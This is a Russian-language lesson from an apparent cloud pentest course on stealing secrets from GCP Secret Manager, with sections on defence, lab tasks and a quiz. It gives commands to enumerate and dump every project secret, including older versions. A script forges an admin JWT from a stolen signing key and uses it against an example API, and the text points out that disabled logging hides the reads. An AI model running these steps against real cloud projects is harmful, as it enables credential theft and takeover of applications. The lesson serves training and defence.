---
id: cloud-gcp-secret-manager
title: "Secret Manager GCP: версии, доступ и кража секретов"
category: cloud
parent: cloud-gcp-secrets-deep
difficulty: medium
order: 1
tags: [cloud, gcp, secret-manager, secrets, iam, kms, audit]
prerequisites: [cloud-gcp-secrets-deep, cloud-secrets-manager]
useful_for:
  - "Кража секретов из GCP"
  - "Анализ IAM на уровне секрета"
  - "Аудит доступа к секретам"
estimated_minutes: 45
summary: "Secret Manager: версии, права secretmanager.versions.access, IAM на уровне секрета, CMEK и audit-логи. Как найти и прочитать секреты при слабых правах."
---

## Зачем этот урок

Secret Manager — централизованное хранилище секретов в GCP: пароли баз, API-ключи, токены, приватные ключи. В отличие от «секретов в переменных окружения», он даёт версионирование и IAM. Но именно из-за централизации он становится точкой максимального риска: одна роль с `secretmanager.versions.access` на `*` раскрывает весь проект. Атакующего интересуют: перечисление секретов, чтение версий, старые версии (иногда с более слабыми секретами) и audit-логи, показывающие, кто ещё их читает.

## Модель Secret Manager

- **Secret** — контейнер с метаданными (метки, rotation, CMEK).
- **Version** — конкретное значение секрета; версии иммутабельны. Есть `latest` и номерные версии, а также состояния (ENABLED/DISABLED/DESTROYED).
- **IAM** — права на уровне проекта, секрета или версии: `roles/secretmanager.secretAccessor` (читать значение), `roles/secretmanager.viewer` (метаданные), `roles/secretmanager.admin` (управление).
- **CMEK** — секрет может шифроваться ключом KMS; чтение требует прав на ключ.
- **Rotation** — автоматическая ротация через Cloud Functions/Pub-Sub; старые версии остаются доступными.
- **Audit** — Cloud Audit Logs пишут `AccessSecretVersion`.

Ключевые права: `secretmanager.secrets.list`, `secretmanager.secrets.get`, `secretmanager.versions.access`, `secretmanager.versions.list`.

## Инструменты и команды

```bash
# Перечисление
gcloud secrets list --project PROJECT_ID
gcloud secrets versions list db-password --project PROJECT_ID

# Метаданные
gcloud secrets describe db-password --format=json | jq '{replication,labels,rotation}'

# Чтение значения
gcloud secrets versions access latest --secret=db-password --project PROJECT_ID
gcloud secrets versions access 1 --secret=db-password   # старая версия

# Через REST с токеном
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets?pageSize=100" \
  | jq -r '.secrets[].name'

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets/db-password/versions/latest:access" \
  | jq -r .payload.data | base64 -d

# IAM секрета
gcloud secrets get-iam-policy db-password
```

## Разобранный пример: от list к чтению всех секретов

Сценарий: у роли есть `roles/secretmanager.viewer` (видит метаданные) и `secretmanager.versions.access` на один секрет. Но часто роли дают шире.

```bash
gcloud secrets list --format='value(name)'
# db-password
# stripe-key
# jwt-signing-key
# sendgrid-api

for s in db-password stripe-key jwt-signing-key sendgrid-api; do
  echo "== $s =="
  gcloud secrets versions access latest --secret="$s" 2>/dev/null | head -c 80; echo
done
# == db-password ==
# S3cr3t-Pr0d-!
# == stripe-key ==
# sk_live_51H8...
# == jwt-signing-key ==
# -----BEGIN PRIVATE KEY-----
# == sendgrid-api ==
# SG.xxxx
```

За один проход получили пароль БД, платёжный ключ, ключ подписи JWT (позволяет подделывать токены) и ключ рассылок. Ключ подписи JWT особенно ценен: с ним можно выпустить токен администратора.

## IAM на уровне секрета и версии

Права можно выдавать точечно: на конкретный секрет (`projects/P/secrets/db-password`) или даже на версию. Это значит:

- Проверяйте, нет ли у вашей роли доступа к секретам с «интересными» именами (`prod`, `admin`, `signing`, `api`).
- Проверяйте старые версии: иногда секрет ротировали, но старая версия осталась с более привилегированным значением.
- Проверяйте `DISABLED`/`DESTROYED` версии: `DESTROYED` прочитать нельзя, `DISABLED` — иногда да (если есть права).
- Смотрите метки (`labels`): они указывают, какой сервис использует секрет.

## Audit-логи и слепые зоны

`AccessSecretVersion` пишется в Cloud Audit Logs (data access). Проверьте:

```bash
gcloud logging read 'protoPayload.methodName="google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion"' \
  --limit 20 --format='table(timestamp, protoPayload.authenticationInfo.principalEmail, protoPayload.resourceName)'
```

Из логов видно, кто и когда читал секреты. Это полезно и защитнику (детект), и атакующему (понять, какие сервисные аккаунты имеют доступ и как выглядит «нормальный» паттерн). Заметьте: `ListSecrets` — это admin activity и логируется всегда; `AccessSecretVersion` — data access, может быть выключен.

## Обход защит и edge cases

- **CMEK.** Если секрет зашифрован собственным ключом, нужен `cloudkms.cryptoKeyVersions.useToDecrypt`. Иначе — `AccessDenied`.
- **VPC-SC.** Периметр может блокировать доступ извне; нужен пивот внутри проекта.
- **Data access logging off.** Если `AccessSecretVersion` не логируется, чтение секретов невидимо — идеально для OPSEC.
- **Replication.** Секрет может реплицироваться в другой регион; политики могут отличаться.
- **Rotation.** При ротации старая версия остаётся; если приложение ещё её использует, секрет «протекает» дольше.

## Частые ошибки и подводные камни

- Путать `secretmanager.viewer` (метаданные) и `secretAccessor` (значение).
- Не проверить старые версии.
- Игнорировать IAM на уровне секрета: роль может не иметь доступа к проекту, но иметь к секрету.
- Забыть про CMEK при чтении.
- Считать, что раз data access логи выключены, то «никто не узнает» — но admin activity (создание/удаление секретов) пишется всегда.

## Защита и детект

- Least privilege: `secretAccessor` на конкретные секреты, не на проект.
- Включить CMEK и ограничить доступ к ключу.
- Включить data access logging и алертить на массовые `AccessSecretVersion`.
- Настроить rotation и удалять старые версии, которые больше не нужны.
- Разделять секреты по средам (prod/dev) и проектам.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — `secretAccessor` на проект. Второй — секреты без CMEK. Третий — старые версии с привилегированными значениями. Четвёртый — выключенный data access logging. Пятый — секреты с «угадываемыми» именами без ограничений. Все они ведут к краже ключей.

## Практическое задание

1. Создайте секрет с двумя версиями; прочитайте обе.
2. Выдайте роль `secretAccessor` только на один секрет и проверьте, что другой недоступен.
3. Включите data access logging и найдите свои `AccessSecretVersion`.
4. Включите CMEK и проверьте, что без прав на ключ чтение падает.

## Что дальше / решение

Из Secret Manager достаём ключи, пароли и приватные ключи. Дальше — использовать их (подделка JWT, доступ к БД, API). Зафиксируйте путь «секрет → значение → эскалация» в графе. При CMEK без прав — `blocked`. Особое внимание — ключам подписи: они дают долгоживущий доступ.

## Разобранный пример 2: ключ подписи JWT и подделка токена

Самый опасный секрет в проекте — ключ подписи токенов. Если у приложения есть секрет `jwt-signing-key` с приватным ключом, атакующий может выпустить токен администратора.

```bash
gcloud secrets versions access latest --secret=jwt-signing-key > /tmp/sign.pem
head -1 /tmp/sign.pem
# -----BEGIN PRIVATE KEY-----

# Формируем поддельный JWT
python3 - <<'PY'
import jwt, time
key = open('/tmp/sign.pem').read()
tok = jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600}, key, algorithm='RS256')
print(tok)
PY
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9....

# Используем токен против API
curl -s -H "Authorization: Bearer eyJhbGciOi..." https://api.example.com/admin/users
# {"users":[...]}
```

Так секрет превращается в полный контроль над приложением без единого пароля. По этой причине ключи подписи должны храниться в HSM/KMS (asymmetric signing), а не в виде PEM-секрета: тогда приватный ключ нельзя экспортировать, а подпись делается через `asymmetricSign`. Если вы нашли именно PEM — считайте приложение скомпрометированным.

## Практическое задание

1. Создайте секрет с приватным ключом и подпишите тестовый JWT.
2. Проверьте токен на локальном сервисе, использующем тот же ключ.
3. Замените ключ на KMS-версию (asymmetricSign) и убедитесь, что приватный ключ не экспортируется.
4. Включите data access logging и найдите чтение секрета.

## Квиз

```quiz
- question: "Какое право раскрывает значение секрета?"
  options:
    - "secretmanager.versions.access"
    - "secretmanager.secrets.list"
    - "secretmanager.secrets.get"
    - "resourcemanager.projects.get"
  answer: 0
  explanation: "versions.access возвращает payload; list/get — только метаданные."
- question: "Почему старые версии секрета опасны?"
  options:
    - "Они могут содержать прежнее привилегированное значение"
    - "Они не читаются"
    - "Они удаляются автоматически"
    - "Они публичны"
  answer: 0
  explanation: "Ротация не удаляет старые версии; там может остаться старый ключ."
- question: "Что нужно для чтения секрета с CMEK?"
  options:
    - "Права на KMS-ключ (useToDecrypt)"
    - "Только versions.access"
    - "Токен OAuth"
    - "Ничего"
  answer: 0
  explanation: "CMEK-шифрование требует расшифровки ключом KMS."
- question: "Какой метод всегда логируется (admin activity)?"
  options:
    - "ListSecrets"
    - "AccessSecretVersion"
    - "GetObject"
    - "Scan"
  answer: 0
  explanation: "Admin activity логируется всегда; data access (AccessSecretVersion) — опционально."
```

## Где пригодится

- **Пентест GCP:** кража секретов проекта.
- **Red team:** получение ключей подписи и API.
- **Cloud IR:** аудит доступа к секретам.
- **Сертификация:** Google Cloud Security.
